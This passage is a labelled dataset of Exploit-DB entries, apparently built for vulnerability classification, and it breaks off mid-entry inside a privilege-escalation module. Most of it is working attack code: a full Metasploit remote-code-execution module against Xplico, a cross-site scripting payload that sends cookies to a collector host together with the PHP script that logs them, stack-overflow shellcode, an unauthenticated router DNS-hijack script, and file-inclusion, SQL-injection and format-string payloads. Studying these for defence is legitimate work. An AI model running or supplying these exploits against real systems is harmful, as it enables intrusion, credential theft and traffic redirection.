or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2012 | Vulnerability Laboratory    --  VULNERABILITY RESEARCH LABORATORY LABORATORY ADMINISTRATION CONTACT: admin@vulnerability-lab.com",critical remote SQL Injection,1
43430,"Xplico - Remote Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient    def initialize(info={})     super(update_info(info,       'Name'           => 'Xplico Remote Code Execution',       'Description'    => %q{         This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal         command under the context of the root user.          The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet         traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create         a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try         to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation.         But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.          One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum         of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.       },       'License'         => MSF_LICENSE,       'Author'          =>         [           'Mehmet Ince <mehmet@mehmetince.net>'  # author & msf module         ],       'References'      =>         [           ['CVE', '2017-16666'],           ['URL', 'https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/'],           ['URL', 'https://www.xplico.org/archives/1538']         ],       'Privileged'      => true,       'Platform'        => ['unix'],       'Arch'            => ARCH_CMD,       'DefaultOptions'  =>         {           'RPORT' => 9876         },       'Payload' =>         {           'Space'       => 252,           'DisableNops' => true,           'BadChars' => ""\x2f\x22"",           'Compat' =>             {               'PayloadType' => 'cmd',               'RequiredCmd' => 'generic netcat gawk', # other cmd payloads can't fit within 252 space due to badchars.             },         },       'Targets'         => [ ['Automatic', {}] ],       'DisclosureDate'  => 'Oct 29 2017',       'DefaultTarget'   => 0     ))    end    def check     # There is no exact way to understand validity of vulnerability without registering new user as well as trigger the command injection.     # which is not something we want to do for only check..!     res = send_request_cgi(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'users', 'register'),     )     if res && res.code == 302       Exploit::CheckCode::Safe     else       Exploit::CheckCode::Unknown     end   end    def initiate_session     print_status('Initiating new session on server side')     res = send_request_cgi(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'users', 'login'),     )     if res && res.code == 200       res.get_cookies     else       nil     end    end    def register_user(username, password)     # First thing first, we need to get csrf token from registration form.     print_status('Registering a new user')      res = send_request_cgi(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'users', 'register'),       'cookie' => @cookie     )      if res && res.code == 200       csrf_token = res.get_hidden_inputs.first['data[_Token][key]'] || nil       fields = res.get_hidden_inputs.first['data[_Token][fields]'] || nil     end      if csrf_token.nil? || fields.nil?       fail_with(Failure::Unknown, 'Unable to extact hidden fields from registration form.')     end      # rand_mail_address sometimes generates buggy email address for this app. So we manually generate email address in here.     email = ''     email << rand_text_alpha_lower(rand(10)+4)     email << '@'     email << rand_text_alpha_lower(rand(10)+4)     email << '.'     email << rand_text_alpha_lower(rand(1)+2)      # Create user     res = send_request_cgi(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'users', 'register'),       'cookie' => @cookie,       'vars_post' => {         '_method' => 'POST',         'data[_Token][key]' => csrf_token,         'data[User][email]' => email,         'data[User][username]' => username,         'data[User][password]' => password,         'data[_Token][fields]' => fields,         'data[_Token][unlocked]' => '',       }     )      if res && res.code == 302       print_good('New user successfully registered')       print_status(""Username: #{username}"")       print_status(""Password: #{password}"")     else       fail_with(Failure::Unknown, 'Could not register new user')     end      # Awesome. We have user. We need to activate it manually..!     print_status('Calculating em_key code of the user')      unixtime = Time.parse(res.headers['Date']).to_i     password_md5 = Rex::Text.md5(password)     em_key = Rex::Text.md5(       ""#{email}#{password_md5}#{unixtime}""     )     print_status(""Activating user with em_key = #{em_key}"")      # We need to follow redirections. Even if we managed to find em_key.     # It will redirect us to the login form. We need to see registration completed on final page.     res = send_request_cgi!(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'users', 'registerConfirm', em_key),       'cookie' => @cookie     )      if res && res.code == 200 && res.body.include?('Registration Completed.')       print_good('User successfully activated')     else       fail_with(Failure::Unknown, 'Could not activated our user. Target may not be vulnerable.')     end   end    def login(username, password)     # yet another csrf token gathering.     print_status('Authenticating with our activated new user')     res = send_request_cgi(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'users', 'login'),       'cookie' => @cookie     )      if res && res.code == 200       csrf_token = res.get_hidden_inputs.first['data[_Token][key]'] || nil       fields = res.get_hidden_inputs.first['data[_Token][fields]'] || nil     end      if csrf_token.nil? || fields.nil?       fail_with(Failure::Unknown, 'Unable to extact hidden fields from login form.')     end      res = send_request_cgi!(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'users', 'login'),       'cookie' => @cookie,       'vars_post' => {         '_method' => 'POST',         'data[_Token][key]' => csrf_token,         'data[User][username]' => username,         'data[User][password]' => password,         'data[_Token][fields]' => fields,         'data[_Token][unlocked]' => '',       }     )      if res && res.body.include?('<a href=""/pols"">Cases</a>')       print_good('Successfully authenticated')     else       fail_with(Failure::Unknown, 'Unable to login.')     end    end    def create_new_case     # We logged in. Not we need to create a new xplico case.     print_status('Creating new case')     pol_name = rand_text_alpha_lower(rand(4)+8)     res = send_request_cgi!(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'pols', 'add'),       'cookie' => @cookie,       'vars_post' => {         '_method' => 'POST',         'data[Capture][Type]' => 0,         'data[Pol][name]' => pol_name,         'data[Pol][external_ref]' => '',       }     )      if res && res.body.include?('The Case has been created')       res.body.scan(/<a href=""\/pols\/view\/([0-9]+)"">/).flatten[0]     else       nil     end   end    def create_new_sol(pol_id)     # Since we xplico case, it's time to create a ""session"" for this case.     print_status('Creating new xplico session for pcap')      sol_name = rand_text_alpha_lower(rand(4)+8)     # sols/add endpoint reads selected case id through session.     # So we need to hit that end-point so we can insert pol_id into the current session data.     send_request_cgi!(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'pols', 'view', pol_id),       'cookie' => @cookie,     )      # Creating new session.     res = send_request_cgi!(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'sols', 'add'),       'cookie' => @cookie,       'vars_post' => {         '_method' => 'POST',         'data[Sol][name]' => sol_name,       }     )      if res && res.body.include?('The Session has been created')       res.body.scan(/<a href=""\/sols\/view\/([0-9]+)"">/).flatten[0]     else       nil     end    end    def upload_pcap(sol_id)     print_status('Uploading malformed PCAP file')     # We are hitting this end-point so we can access sol_id through session on server-side.     send_request_cgi!(       'method' => 'GET',       'uri' => normalize_uri(target_uri.path, 'sols', 'view', sol_id),       'cookie' => @cookie,     )      # Reading malformed pcap files.     path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2017-16666', 'dump.pcap')     fd = ::File.open( path, 'rb')     pcap = fd.read(fd.stat.size)     fd.close      data = Rex::MIME::Message.new     data.add_part('POST', nil, nil, 'form-data; name=""_method""')     data.add_part(pcap, 'application/octet-stream', nil, ""form-data; name=\""data[Sols][File]\""; filename=\""`#{payload.encoded})`\"""") # Yes back-tick injection!      # Uploading PCAP file.     res = send_request_cgi(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'sols', 'pcap'),       'cookie' => @cookie,       'ctype'    => ""multipart/form-data; boundary=#{data.bound}"",       'data'     => data.to_s     )      if res && res.code == 302       print_good('PCAP successfully uploaded. Pcap parser is going to start on server side.')     end      # We can not wait all the day long to have session.     # So we are checking status of decoding process 5 times with sleep for a 1 second on each loop.     is_job_done = nil     counter = 0     until session_created? || !is_job_done.nil? || counter == 5       res = send_request_cgi(         'method' => 'GET',         'uri' => normalize_uri(target_uri.path, 'sols', 'view', sol_id),         'cookie' => @cookie,       )       if res && res.body.include?('File uploaded, wait start decoding...')         print_status('Parsing has started. Wait for parser to get the job done...')       end       if res && res.body.include?('DECODING')         print_good('We are at PCAP decoding phase. Little bit more patience...')       end       # Tbh decoding process is not going to be finished as long as we have msf session.       # We are not going to see this case if we are successful exploiting.       if res && res.body.include?('DECODING COMPLETED')         print_warning('PCAP parsing process has finished. Haven\'t you got your shell ?')         is_job_done = 1         next       end       sleep(1)       counter += 1     end    end    def exploit      if check == Exploit::CheckCode::Safe       fail_with(Failure::NotVulnerable, ""#{peer} - Target not vulnerable"")     end      # We need to access cookie from everywhere. Thus making it global variable.     @cookie = initiate_session     if @cookie.nil?       fail_with(Failure::Unknown, 'Unable to initiate new sessionid on server.')     end      # We only need to access username and password for login func. Let's leave them as a local variables.     password = rand_text_alpha(32)     username = rand_text_alpha_lower(rand(8)+8)     register_user(username, password)     login(username, password)      # We will need to have pol_id for creating new xplico session.     pol_id = create_new_case     if pol_id.nil?       fail_with(Failure::Unknown, 'Unable to create New Case.')     end     print_good(""New Case successfully creted. Our pol_id = #{pol_id}"")      # Create xplico session by using pol_id     sol_id = create_new_sol(pol_id)     if sol_id.nil?       fail_with(Failure::Unknown, 'Unable to create New Sol.')     end     print_good(""New Sols successfully creted. Our sol_id = #{sol_id}"")      # Uploading malformed PCAP file. We are exploiting authenticated cmd inj in here.     upload_pcap(sol_id)    end end",Remote Code Execution,1
24648,"W-Agora 4.1.6 - 'a redir_url.php?key' SQL Injection source: https://www.securityfocus.com/bid/11283/info  Multiple vulnerabilities are reported to affect the application. These issues arise due to insufficient sanitization of user-supplied data. A remote attacker may leverage these vulnerabilities to carry out SQL injection, cross-site scripting, and HTTP response splitting attacks.  These issues were identified in W-Agora 4.1.6a, however, it is possible that other versions are also affected.  redir_url.php?bn=demos_links&key=[SQL]",SQL Injection,1
27060,"PHP-Nuke News Submission Story - Text Field Cross-Site Scripting source: https://www.securityfocus.com/bid/16192/info  The PHPNuke Pool and News Modules are prone to an HTML injection vulnerability. This issue is due to a failure in the application modules to properly sanitize user-supplied input before using it in dynamically generated content.  Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.   <img src=""javascript:window.navigate('http://www.example.com/cookies.php?c='+document.cookie);""  cookies.php $cookie = $_GET['c']; $ip = getenv ('REMOTE_ADDR'); $date=date(""j F, Y, g:i a""); $referer=getenv ('HTTP_REFERER'); $fp = fopen('steal.php', 'a'); fwrite($fp, ' Cookie: '.$cookie.' IP: ' .$ip. ' Date and Time: ' .$date. ' Referer: '.$referer.' '); fclose($fp); ?>",Text Field Cross-Site Scripting,1
6671,"Microsoft Windows Vista - Access Violation from Limited Account (Blue Screen of Death) // ////////////////////////////////////////////////////////////// // Windows Vista BSoD (Access violation) from limited account. // // Tested on Home Premium & Ultimate @ October 05 2008         // ///////////////////////////////////////////////////////////////// #include <stdio.h> #include <windows.h>  WCHAR szClass[] = L""BSODClass"";  int ExceptionHandler(EXCEPTION_POINTERS* lpExceptionInfo); typedef void (WINAPI* pFunc)(ULONG ulFirst, LPVOID lpHandler); pFunc pRtlAddVectoredExceptionHandler;  typedef struct {     DWORD dwWriteViolation;     LPVOID lpAddress; } EXCEPTION_ACCESS_VIOLATION_PARAMS;  int main() {     WNDCLASSW wc;     DWORD dwOldProt;      printf(""Windows Vista BSoD from usermode/limited account.\n""            ""Coded by. Defsanguje - October 05 2008\n"");      // Setup vectored exception handler. SEH would work also.     pRtlAddVectoredExceptionHandler = (pFunc)GetProcAddress((HMODULE)GetModuleHandle(""ntdll.dll""),                                                             ""RtlAddVectoredExceptionHandler"");     (*pRtlAddVectoredExceptionHandler)(TRUE, ExceptionHandler);      // Dummy data     wc.style         = 0;     wc.lpfnWndProc   = NULL;     wc.cbClsExtra    = 0;     wc.cbWndExtra    = 0;     wc.hInstance     = GetModuleHandle(NULL);     wc.hIcon         = NULL;     wc.hCursor       = LoadCursor(NULL, IDC_ARROW);     wc.hbrBackground = GetStockObject(HOLLOW_BRUSH);     wc.lpszMenuName  = NULL;     wc.lpszClassName = szClass;      VirtualProtect(szClass, 1, PAGE_NOACCESS, &dwOldProt);     RegisterClassW(&wc);      printf(""You shouldn't see this"");     return 0; }  int ExceptionHandler(EXCEPTION_POINTERS* lpExceptionInfo) {     static LPVOID lpLastAddress;     static DWORD dwOldProt;     EXCEPTION_ACCESS_VIOLATION_PARAMS* avParams;     switch(lpExceptionInfo->ExceptionRecord->ExceptionCode)     {         case EXCEPTION_ACCESS_VIOLATION:             avParams = (EXCEPTION_ACCESS_VIOLATION_PARAMS*)lpExceptionInfo->ExceptionRecord->ExceptionInformation;             VirtualProtect(avParams->lpAddress, 1, PAGE_READWRITE, &dwOldProt);             lpLastAddress = avParams->lpAddress;              // Set trap flag             lpExceptionInfo->ContextRecord->EFlags |= 0x100;             break;         case STATUS_SINGLE_STEP:             VirtualProtect(lpLastAddress, 1, PAGE_NOACCESS, &dwOldProt);             break;         default:             break;     }     return EXCEPTION_CONTINUE_EXECUTION; ; }  // milw0rm.com [2008-10-04]",Access Violation,1
38687,"Sam Spade 1.14 - S-Lang Command Field Overflow (SEH) #!/usr/bin/env python # Exploit Title     : Sam Spade 1.14 S-Lang Command Field SEH Overflow Crash PoC # Discovery by      : Nipun Jaswal # Email             : mail@nipunjaswal.info # Discovery Date    : 12/11/2015 # Vendor Homepage   : http://samspade.org # Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html # Tested Version    : 1.14 # Vulnerability Type: Denial of Service (DoS) Local # Tested on OS      : Windows XP Professional SP2 x86 es # Crash Point       : Go to Tools > S-Lang Command> Enter the contents of 'sam_spade_slang_dos.txt' > OK , Note: Do Not Remove the round bracket ########################################################################################## #  -----------------------------------NOTES----------------------------------------------# ########################################################################################## # And the Stack #00FBFE80   41414141  AAAA #00FBFE84   41414141  AAAA #00FBFE88   42424242  BBBB  Pointer to next SEH record #00FBFE8C   43434343  CCCC  SE handler  # After the execution of POC, the SEH chain looks like this:  #Address    SE handler #00FBFE88   43434343 #42424242   *** CORRUPT ENTRY ***  f = open(""sam_spade_slang_dos.txt"", ""w"") Junk_a = ""A""*528 nseh= ""B"" * 4 seh= ""C"" *4  f.write(Junk_a+nseh+seh) f.close()",S-Lang Command Field Overflow,1
27508,"PHP 4.x/5.x - 'Html_Entity_Decode()' Information Disclosure source: https://www.securityfocus.com/bid/17296/info  PHP 'html_entity_decode()' function is prone to an information-disclosure vulnerability. This issue arises when a script using the function accepts data from a remote untrusted source and returns the function's result to an attacker.   Information that the attacker gathers by exploiting this vulnerability may aid in other attacks.  PHP versions prior to 5.1.3-RC1 are vulnerable to this issue.  <?php  $foobar=html_entity_decode($_GET['foo']); echo $foobar;  ?>  Running it with url:  http://www.example.com/index.php?foo=%00sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss! ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss! ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss   curl ""http://www.example.com/phpmyfaq/admin/index.php"" -D - -d ""faqusername=%00VERYLONGSTRINGHEREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE""",Information Disclosure,1
34016,Snipe Gallery 3.1 - 'gallery.php?cfg_admin_path' Remote File Inclusion source: https://www.securityfocus.com/bid/40279/info  Snipe Gallery is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.  The issues affect Snipe Gallery versions 3.1.5 and prior.   http://www.example.com/gallery.php?cfg_admin_path=[shell.txt ],Remote File Inclusion,1
2486,"phpBB Random User Registration Number 1.0 Mod - Remote File Inclusion - phpBB RANDOm USER REGISTRATION NUMBER 1.0 File Include Vulnerability  - bd0rk || SOH-Crew  - URL: http://www.nivisec.com/downloads/phpbb/random_image_register_v100.zip  - Code: include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_random_num_reg.' . $phpEx);  [+] Exploit: /includes/functions_num_image.php?phpbb_root_path=http://[target]/Shell?  Gr33tings: str0ke, TheJT, Lu7k, x0r_32  # milw0rm.com [2006-10-07]",Remote File Inclusion,1
9671,"Tuniac 090517c - '.pls' Local Crash (PoC) #!/usr/bin/env python # Tuniac v.090517c (.PLS) Crash PoC # By : zAx # http://sourceforge.net/projects/tuniac/files/tuniac/090517/Tuniac_Setup_090517c.exe/download  buffer = (""[playlist]\x0ANumberOfEntries=1\x0AFile1=http://"" + ""\x41"" * (10000));  f = open('Crash_Poc.PLS','w'); f.write(buffer); f.close();  # milw0rm.com [2009-09-14]",Local Crash,1
20136,"NAI Net Tools PKI Server 1.0 - Format String source: https://www.securityfocus.com/bid/1538/info  Certain versions of Network Associates Inc.'s Net Tools PKI (Public Key Infrastructure) server ship with a vulnerability which allows remote attackers to execute arbitrary commands on the system which the PKI server resides. The problem lies within the webserver component of the PKI server (strong.exe) which operates several 'virtual servers' required to operate the PKI server. The first is the Administrative Web Server which listens via TCP port 443, the second is Enrollment Web Server which listens on TCP port 444. Unlike the Administrative Web Server the Enrollment Web Server does not require credentials to be exchanged before a user can talk to the webserver. It is via this virtual server that an attacker can exploit the problem at hand. The following is taken directly from the CORE SDI advisory on this issue:  ""User supplied URL's are processed by Strong.exe. If a url with an .XUDA extension is found, the request is forwarded to XUDAD.EXE for further processing. Prior to this ""hand-off"" the URL string is parsed, filtered for meta characters and passed to a function that logs the request. Somewhere along the processing path, the user supplied data becomes the format string for a formatted output function similar to the ANSI C sprintf(). This allows a remote attacker to provide data that will force that function into overwriting arbitrary portions of the process memory and cause either a denial of service attack or the execution of arbitrary code.""  https://host:444/xxx%3c%b9%ff%01%25%25x%25%25x%25%25x%25%25x%25%25x%25\ %25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25\ %25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25\ %25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25%25x%25\ %25x%25%25x%25x%25n.xuda  note: the string has been wrapped for readability.",Format String,1
39594,"CoolPlayer (Standalone) build 2.19 - '.m3u' Local Stack Overflow # Exploit Title: CoolPlayer (Standalone) build 2.19 - .m3u Stack Overflow # Date: 22-03-2016 # Software Link: https://sourceforge.net/projects/coolplayer/files/Coolplayer/219/CoolPlayer219_Bin.zip # Exploit Author: Charley Celice (stmerry) # Contact: https://twitter.com/charleycelice # # Credits: Yet another exploit code for Coolplayer (Standalone). Slightly modified version.  # * https://www.exploit-db.com/search/?action=search&description=coolplayer # # Category: Exploits # Tested on: Windows XP SP3 EN # Details: Stack overflow. Overwrite the EIP and point to ESP (iertutil.dll) to execute shellcode (calc.exe)  my $file= ""exploit.m3u""; my $junk= ""\x41"" x 248; my $eip= ""\x97\x51\x08\x3e""; # jmp esp - iertutil.dll my $nops = ""\x90"" x 10;  # shellcode (XP SP3 calc.exe) my $shell = ""\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"" . ""\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"" . ""\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"" .  ""\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"" . ""\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"" . ""\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"" . ""\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"" . ""\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"" . ""\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"" . ""\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"" . ""\x7f\xe8\x7b\xca"";   open($FILE,"">$file""); print $FILE $junk.$eip.$nops.$shell; close($FILE); print ""done\n"";",Local Stack Overflow,1
40373,"ASUS DSL-X11 ADSL Router - DNS Change #!/bin/bash # #   ASUS DSL-X11 ADSL Router Unauthenticated  Remote DNS Change Exploit # #  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com> #  https://www.ethical-hacker.org/ #  https://www.facebook.com/ethicalhackerorg # #  Description:   #  The vulnerability exist in the web interface, which is  #  accessible without authentication.  # #  Once modified, systems use foreign DNS servers,  which are  #  usually set up by cybercriminals. Users with vulnerable  #  systems or devices who try to access certain sites are  #  instead redirected to possibly malicious sites. #   #  Modifying systems' DNS settings allows cybercriminals to  #  perform malicious activities like: # #    o  Steering unknowing users to bad sites:  #       These sites can be phishing pages that  #       spoof well-known sites in order to  #       trick users into handing out sensitive  #       information. # #    o  Replacing ads on legitimate sites:  #       Visiting certain sites can serve users  #       with infected systems a different set  #       of ads from those whose systems are  #       not infected. #    #    o  Controlling and redirecting network traffic:  #       Users of infected systems may not be granted  #       access to download important OS and software  #       updates from vendors like Microsoft and from  #       their respective security vendors. # #    o  Pushing additional malware:  #       Infected systems are more prone to other  #       malware infections (e.g., FAKEAV infection). # #  Disclaimer: #  This or previous programs is for Educational  #  purpose ONLY. Do not use it without permission.  #  The usual disclaimer applies, especially the  #  fact that Todor Donev is not liable for any  #  damages caused by direct or indirect use of the  #  information or functionality provided by these  #  programs. The author or any Internet provider  #  bears NO responsibility for content or misuse  #  of these programs or any derivatives thereof. #  By using these programs you accept the fact  #  that any damage (dataloss, system crash,  #  system compromise, etc.) caused by the use  #  of these programs is not Todor Donev's  #  responsibility. #    #  Use them at your own risk! # #    if [[ $# -gt 3 || $# -lt 2 ]]; then         echo ""                  ASUS DSL-X11 ADSL Router ""          echo ""           Unauthenticated Remote DNS Change Exploit""         echo ""  ===================================================================""         echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""         echo ""  Example: $0 133.7.133.7 8.8.8.8""         echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""         echo """"         echo ""      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>""         echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""         exit; fi GET=`which GET 2>/dev/null` if [ $? -ne 0 ]; then         echo ""  Error : libwww-perl not found =/""         exit; fi         GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1",DNS Change,1
15257,"PCDJ Karaoki 0.6.3819 - Denial of Service #Exploit Title :Karaoki Denial of Service Vulnerability #Software : Karaoki #Software link : http://software-files-l.cnet.com/s/software/11/43/82/66/pcdj_karaoki_setup_0.6.3819.exe?e=1287174968&h=9dd7fd008e533071b8d4874fd9a01487&lop=link&ptype=1901&ontid=18502&siteId=4&edId=3&spi=918adb963da1de63d1bfc9fd1a36ab5a&pid=11438266&psid=75072918&fileName=pcdj_karaoki_setup_0.6.3819.exe #Autor : ABDI MOHAMED #Email : abdimohamed@hotmail.fr #Software version : n/a #Tested on : Win7 Ultimate fr  #!/usr/bin/python outfile=""killer.m3u"" junk=""\x41"" * 105000 FILE=open(outfile, ""w"") FILE.write(junk) FILE.close() print ""[+] File created succesufully ,( the hacker is who create something !!! ) [+]""",Denial of Service,1
44150,"MagniComp SysInfo - mcsiwrapper Privilege Escalation (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Local   Rank = ExcellentRanking    include Msf::Post::File   include Msf::Exploit::EXE   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'MagniComp SysInfo mcsiwrapper Privilege Escalation',       'Description'    => %q{         This module attempts to gain root privileges on systems running         MagniComp SysInfo versions prior to 10-H64.          The .mcsiwrapper suid executable allows loading a config file using the         '--configfile' argument. The 'ExecPath' config directive is used to set         the executable load path. This module abuses this functionality to set         the load path resulting in execution of arbitrary code as root.          This module has been tested successfully with SysInfo version         10-H63 on Fedora 20 x86_64, 10-H32 on Fedora 27 x86_64, 10-H10 on         Debian 8 x86_64, and 10-GA on Solaris 10u11 x86.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Daniel Lawson', # Discovery and exploit           'Romain Trouve', # Discovery and exploit           'Brendan Coles'  # Metasploit         ],       'DisclosureDate' => 'Sep 23 2016',       'Platform'       => %w(linux solaris),       'Arch'           => [ ARCH_X86, ARCH_X64 ],       'SessionTypes'   => [ 'shell', 'meterpreter' ],       'Targets'        =>         [           [ 'Automatic', { } ],           [ 'Solaris', { 'Platform' => 'solaris', 'Arch' => ARCH_X86 } ],           [ 'Linux', { 'Platform' => 'linux', 'Arch' => [ ARCH_X86, ARCH_X64 ]} ]         ],       'References'     =>         [           [ 'CVE', '2017-6516' ],           [ 'BID', '96934' ],           [ 'URL', 'http://www.magnicomp.com/support/cve/CVE-2017-6516.shtml' ],           [ 'URL', 'https://labs.mwrinfosecurity.com/advisories/magnicomps-sysinfo-root-setuid-local-privilege-escalation-vulnerability/' ],           [ 'URL', 'https://labs.mwrinfosecurity.com/advisories/multiple-vulnerabilities-in-magnicomps-sysinfo-root-setuid/' ]         ]     ))     register_options(       [         OptString.new('SYSINFO_DIR', [ true, 'Path to SysInfo directory', '/opt/sysinfo' ]),         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])       ])   end    def sysinfo_dir     datastore['SYSINFO_DIR']   end    def check     unless cmd_exec(""test -d #{sysinfo_dir} && echo true"").include? 'true'       vprint_good ""Directory '#{sysinfo_dir}' does not exist""       return CheckCode::Safe     end     vprint_good ""Directory '#{sysinfo_dir}' exists""      mcsiwrapper_path = ""#{sysinfo_dir}/bin/.mcsiwrapper""     unless setuid? mcsiwrapper_path       vprint_error 